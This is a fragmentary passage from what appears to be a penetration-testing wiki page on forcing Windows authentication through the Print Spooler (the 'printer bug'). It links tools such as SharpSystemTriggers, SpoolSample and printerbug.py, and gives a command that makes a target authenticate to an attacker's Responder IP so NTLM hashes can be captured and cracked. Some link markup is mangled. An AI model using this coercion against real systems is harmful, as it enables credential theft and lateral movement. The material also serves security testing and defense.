...
[[https://github.com/cube0x0/SharpSystemTriggers|**SharpSystemTriggers**]] is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.
...
Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [[https://github.com/NotMedic/NetNTLMtoSilverTicket|SpoolerScanner]], see if the Spooler Service is listening:
...
You can compile[[https://github.com/NotMedic/NetNTLMtoSilverTicket| **SpoolSample from here**]]**.**

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
```
or use [[https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py|**3xocyte's dementor.py**]] if you're on Linux
...
If you can capture [[../ntlm/index.html#ntlmv1-attack|NTLMv1 challenges read here how to crack them]].\
